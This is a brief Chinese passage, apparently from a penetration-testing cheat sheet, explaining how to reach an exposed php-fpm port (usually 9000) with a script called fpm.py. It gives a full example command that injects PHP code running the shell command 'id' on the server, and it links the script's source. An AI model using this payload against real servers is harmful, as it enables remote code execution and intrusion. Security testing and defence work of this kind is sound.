...
php-fpm通信绕过方法可使用fpm.py利用，示例:python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c '<?php echo `id`;exit;?>'，(需要服务器把php-fpm端口暴露在外网，一般为9000端口)，php-fpm.py来源于:https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
